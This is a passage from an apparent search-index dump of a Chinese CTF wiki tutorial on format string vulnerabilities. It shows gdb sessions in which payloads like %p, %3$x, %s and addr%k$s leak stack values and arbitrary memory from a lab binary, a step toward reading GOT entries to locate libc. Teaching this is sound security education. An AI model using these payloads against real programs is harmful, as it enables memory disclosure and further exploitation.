\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u8f93\u51fa\u4e86\u6bcf\u4e00\u4e2a\u53d8\u91cf\u5bf9\u5e94\u7684\u6570\u503c\uff0c\u5e76\u4e14\u65ad\u5728\u4e86\u4e0b\u4e00\u4e2aprintf\u5904 Breakpoint 1 , __printf ( format = 0xffffcd10 \"%08x.%08x.%08x\" ) at printf.c:28 28 in printf.c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%08x.%08x.%08x\" \u2190 $eax 0xffffcd14\u2502+0x18: \".%08x.%08x\" 0xffffcd18\u2502+0x1c: \"x.%08x\" \u6b64\u65f6\uff0c\u7531\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a%x%x%x\uff0c\u6240\u4ee5\uff0c\u7a0b\u5e8f \u4f1a\u5c06\u6808\u4e0a\u76840xffffcd04\u53ca\u5176\u4e4b\u540e\u7684\u6570\u503c\u5206\u522b\u4f5c\u4e3a\u7b2c\u4e00\uff0c\u7b2c\u4e8c\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u6309\u7167int\u578b\u8fdb\u884c\u89e3\u6790\uff0c\u5206\u522b\u8f93\u51fa\u3002\u7ee7\u7eed\u8fd0\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\u53bb\uff0c\u786e\u5b9e\u548c\u60f3\u8c61\u4e2d\u7684\u4e00\u6837\u3002 gef\u27a4 c Continuing. ffffcd10.000000c2.f7e8b6bb [ Inferior 1 ( process 57077 ) exited normally ] \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528%p\u6765\u83b7\u53d6\u6570\u636e\uff0c\u5982\u4e0b % p .% p .% p 00000001.22222222 . ffffffff .% p .% p .% p 0xfff328c0 . 0xc2 . 0xf75c46bb \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6bcf\u6b21\u5f97\u5230\u7684\u7ed3\u679c\u90fd\u4e00\u6837 \uff0c\u56e0\u4e3a\u6808\u4e0a\u7684\u6570\u636e\u4f1a\u56e0\u4e3a\u6bcf\u6b21\u5206\u914d\u7684\u5185\u5b58\u9875\u4e0d\u540c\u800c\u6709\u6240\u4e0d\u540c\uff0c\u8fd9\u662f\u56e0\u4e3a\u6808\u662f\u4e0d\u5bf9\u5185\u5b58\u9875\u505a\u521d\u59cb\u5316\u7684\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u4e0a\u9762\u7ed9\u51fa\u7684\u65b9\u6cd5\uff0c\u90fd\u662f\u4f9d\u6b21\u83b7\u5f97\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u6808\u4e2d\u88ab\u89c6\u4e3a\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u503c\u5462 \uff1f\u80af\u5b9a\u662f\u53ef\u4ee5\u7684\u5566\u3002\u65b9\u6cd5\u5982\u4e0b %n$x \u5229\u7528\u5982\u4e0b\u7684\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u5bf9\u5e94\u7684\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u6570\u503c\u3002\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u8981\u8bf4\u662f\u5bf9\u5e94\u7b2cn+1\u4e2a\u53c2\u6570\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u53c2\u6570\u91cc\u9762\u7684n\u6307\u7684\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u7b2cn\u4e2a\u8f93\u51fa\u53c2\u6570\uff0c\u90a3\u76f8\u5bf9\u4e8e\u8f93\u51fa\u51fd\u6570\u6765\u8bf4\uff0c\u5c31\u662f\u7b2cn+1\u4e2a\u53c2\u6570\u4e86\u3002 \u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u4ee5gdb\u8c03\u8bd5\u4e00\u4e0b\u3002 \u279c leakmemory git: ( master ) \u2717 gdb leakmemory gef\u27a4 b printf Breakpoint 1 at 0x8048330 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory %3 $x Breakpoint 1 , __printf ( format = 0x8048563 \"%08x.%08x.%08x.%s\\n\" ) at printf.c:28 28 printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccec' , 'l8' ] 8 0xffffccec\u2502+0x00: 0x080484bf \u2192 <main+84> add esp, 0x20 \u2190 $esp 0xffffccf0\u2502+0x04: 0x08048563 \u2192 \"%08x.%08x.%08x.%s\" 0xffffccf4\u2502+0x08: 0x00000001 0xffffccf8\u2502+0x0c: 0x22222222 0xffffccfc\u2502+0x10: 0xffffffff 0xffffcd00\u2502+0x14: 0xffffcd10 \u2192 \"%3 $x \" 0xffffcd04\u2502+0x18: 0xffffcd10 \u2192 \"%3 $x \" 0xffffcd08\u2502+0x1c: 0x000000c2 gef\u27a4 c Continuing. 00000001 .22222222.ffffffff.%3 $x Breakpoint 1 , __printf ( format = 0xffffcd10 \"%3 $x \" ) at printf.c:28 28 in printf.c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%3 $x \" 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%3 $x \" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%3 $x \" \u2190 $eax 0xffffcd14\u2502+0x18: 0xffffce00 \u2192 0x00000001 0xffffcd18\u2502+0x1c: 0x000000e0 gef\u27a4 c Continuing. f7e8b6bb [ Inferior 1 ( process 57442 ) exited normally ] \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u786e\u5b9e\u83b7\u5f97\u4e86printf\u7684\u7b2c4\u4e2a\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u503cf7e8b6bb\u3002","title":"\u83b7\u53d6\u6808\u53d8\u91cf\u6570\u503c"},{"location":"pwn/fmtstr/fmtstr_exploit/#_6","text":"\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u5f97\u6808\u53d8\u91cf\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u9700\u8981\u7528\u5230%s\u4e86\u3002\u8fd9\u91cc\u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u8fdb\u884cgdb\u8c03\u8bd5\uff0c\u5982\u4e0b \u279c leakmemory git: ( master ) \u2717 gdb leakmemory gef\u27a4 b printf Breakpoint 1 at 0x8048330 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory %s Breakpoint 1 , __printf ( format = 0x8048563 \"%08x.%08x.%08x.%s\\n\" ) at printf.c:28 28 printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccec' , 'l8' ] 8 0xffffccec\u2502+0x00: 0x080484bf \u2192 <main+84> add esp, 0x20 \u2190 $esp 0xffffccf0\u2502+0x04: 0x08048563 \u2192 \"%08x.%08x.%08x.%s\" 0xffffccf4\u2502+0x08: 0x00000001 0xffffccf8\u2502+0x0c: 0x22222222 0xffffccfc\u2502+0x10: 0xffffffff 0xffffcd00\u2502+0x14: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd04\u2502+0x18: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd08\u2502+0x1c: 0x000000c2 gef\u27a4 c Continuing. 00000001 .22222222.ffffffff.%s Breakpoint 1 , __printf ( format = 0xffffcd10 \"%s\" ) at printf.c:28 28 in printf.c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: 0xff007325 ( \"%s\" ? ) \u2190 $eax 0xffffcd14\u2502+0x18: 0xffffce3c \u2192 0xffffd074 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd18\u2502+0x1c: 0x000000e0 gef\u27a4 c Continuing. %s [ Inferior 1 ( process 57488 ) exited normally ] \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u7b2c\u4e8c\u6b21\u6267\u884cprintf\u51fd\u6570\u7684\u65f6\u5019\uff0c\u786e\u5b9e\u662f\u5c060xffffcd04\u5904\u7684\u53d8\u91cf\u89c6\u4e3a\u5b57\u7b26\u4e32\u53d8\u91cf\uff0c\u8f93\u51fa\u4e86\u5176\u6570\u503c\u6240\u5bf9\u5e94\u7684\u5730\u5740\u5904\u7684\u5b57\u7b26\u4e32\u3002 \u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u8fd9\u6837\u7684\u90fd\u4f1a\u6b63\u5e38\u8fd0\u884c\uff0c\u5982\u679c\u5bf9\u5e94\u7684\u53d8\u91cf\u4e0d\u80fd\u591f\u88ab\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\u5730\u5740\uff0c\u90a3\u4e48\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u5d29\u6e83\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6307\u5b9a\u83b7\u53d6\u6808\u4e0a\u7b2c\u51e0\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8f93\u51fa\uff0c\u6bd4\u5982\u6211\u4eec\u6307\u5b9a\u7b2cprintf\u7684\u7b2c3\u4e2a\u53c2\u6570\uff0c\u5982\u4e0b\uff0c\u6b64\u65f6\u7a0b\u5e8f\u5c31\u4e0d\u80fd\u591f\u89e3\u6790\uff0c\u5c31\u5d29\u6e83\u4e86\u3002 \u279c leakmemory git: ( master ) \u2717 ./leakmemory %2 $s 00000001 .22222222.ffffffff.%2 $s [ 1 ] 57534 segmentation fault ( core dumped ) ./leakmemory \u5c0f\u6280\u5de7\u603b\u7ed3 \u5229\u7528%x\u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528%p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002 \u5229\u7528%s\u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002 \u5229\u7528%order$x\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528%order$s\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002","title":"\u83b7\u53d6\u6808\u53d8\u91cf\u5bf9\u5e94\u5b57\u7b26\u4e32"},{"location":"pwn/fmtstr/fmtstr_exploit/#_7","text":"\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u4e0a\u9762\u65e0\u8bba\u662f\u6cc4\u9732\u6808\u4e0a\u8fde\u7eed\u7684\u53d8\u91cf\uff0c\u8fd8\u662f\u8bf4\u6cc4\u9732\u6307\u5b9a\u7684\u53d8\u91cf\u503c\uff0c\u6211\u4eec\u90fd\u6ca1\u80fd\u5b8c\u5168\u63a7\u5236\u6211\u4eec\u6240\u8981\u6cc4\u9732\u7684\u53d8\u91cf\u7684\u5730\u5740\u3002\u8fd9\u6837\u7684\u6cc4\u9732\u56fa\u7136\u6709\u7528\uff0c\u53ef\u662f\u5374\u4e0d\u591f\u5f3a\u529b\u6709\u6548\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u60f3\u8981\u6cc4\u9732\u67d0\u4e00\u4e2alibc\u51fd\u6570\u7684got\u8868\u5185\u5bb9\uff0c\u4ece\u800c\u5f97\u5230\u5176\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\u4ee5\u53ca\u5176\u4ed6\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5019\uff0c\u80fd\u591f\u5b8c\u5168\u63a7\u5236\u6cc4\u9732\u67d0\u4e2a\u6307\u5b9a\u5730\u5740\u7684\u5185\u5b58\u5c31\u663e\u5f97\u5f88\u91cd\u8981\u4e86\u3002\u90a3\u4e48\u6211\u4eec\u7a76\u7adf\u80fd\u4e0d\u80fd\u8fd9\u6837\u505a\u5462\uff1f\u81ea\u7136\u4e5f\u662f\u53ef\u4ee5\u7684\u5566\u3002 \u6211\u4eec\u518d\u4ed4\u7ec6\u56de\u60f3\u4e00\u4e0b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\uff0c\u6211\u4eec\u6240\u8bfb\u53d6\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5728\u6808\u4e0a\u7684\uff08\u56e0\u4e3a\u662f\u67d0\u4e2a\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u672c\u4f8b\u4e2ds\u662fmain\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff09\u3002\u90a3\u4e48\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u8c03\u7528\u8f93\u51fa\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\u5176\u5b9e\u5c31\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u6211\u4eec\u9009\u62e9\u4e0a\u9762\u7684\u67d0\u4e2a\u51fd\u6570\u8c03\u7528\u4e3a\u4f8b Breakpoint 1 , __printf ( format = 0xffffcd10 \"%s\" ) at printf.c:28 28 in printf.c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 0xff007325 ( \"%s\" ? ) 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: 0xff007325 ( \"%s\" ? ) \u2190 $eax 0xffffcd14\u2502+0x18: 0xffffce3c \u2192 0xffffd074 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd18\u2502+0x1c: 0x000000e0 \u53ef\u4ee5\u770b\u51fa\u5728\u6808\u4e0a\u7684\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u5c31\u662f\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57400xffffcd10\uff0c\u540c\u65f6\u8be5\u5730\u5740\u5b58\u50a8\u7684\u4e5f\u786e\u5b9e\u662f\u662f\"%s\"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u3002 \u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u8f93\u51fa\u51fd\u6570\u8c03\u7528\u65f6\u662f\u7b2c\u51e0\u4e2a\u53c2\u6570\uff0c\u8fd9\u91cc\u5047\u8bbe\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5bf9\u51fd\u6570\u8c03\u7528\u4e3a\u7b2ck\u4e2a\u53c2\u6570\u3002\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u67d0\u4e2a\u6307\u5b9a\u5730\u5740addr\u7684\u5185\u5bb9\u3002 addr%k$s \u6ce8\uff1a \u5728\u8fd9\u91cc\uff0c\u5982\u679c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u6808\u4e0a\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u4e00\u5b9a\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5bf9\u504f\u79fb\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\u6808\u6307\u9488\u81f3\u5c11\u4f4e\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57408\u5b57\u8282\u6216\u800516\u5b57\u8282\u3002 \u4e0b\u9762\u5c31\u662f\u5982\u4f55\u786e\u5b9a\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a\u7b2c\u51e0\u4e2a\u53c2\u6570\u7684\u95ee\u9898\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u786e\u5b9a [tag]%p%p%p%p%p%p... \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u91cd\u590d\u67d0\u4e2a\u5b57\u7b26\u7684\u673a\u5668\u5b57\u957f\u6765\u4f5c\u4e3atag\uff0c\u800c\u540e\u9762\u4f1a\u8ddf\u4e0a\u82e5\u5e72\u4e2a%p\u6765\u8f93\u51fa\u6808\u4e0a\u7684\u5185\u5bb9\uff0c\u5982\u679c\u5185\u5bb9\u4e0e\u6211\u4eec\u524d\u9762\u7684tag\u91cd\u590d\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6709\u5f88\u5927\u628a\u63e1\u8bf4\u660e\u8be5\u5730\u5740\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u4e4b\u6240\u4ee5\u8bf4\u662f\u6709\u5f88\u5927\u628a\u63e1\uff0c\u8fd9\u662f\u56e0\u4e3a\u4e0d\u6392\u9664\u6808\u4e0a\u6709\u4e00\u4e9b\u4e34\u65f6\u53d8\u91cf\u4e5f\u662f\u8be5\u6570\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6781\u5176\u5c11\u89c1\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u66f4\u6362\u5176\u4ed6\u5b57\u7b26\u8fdb\u884c\u5c1d\u8bd5\uff0c\u8fdb\u884c\u518d\u6b21\u786e\u8ba4\u3002\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5b57\u7b26'A'\u4f5c\u4e3a\u7279\u5b9a\u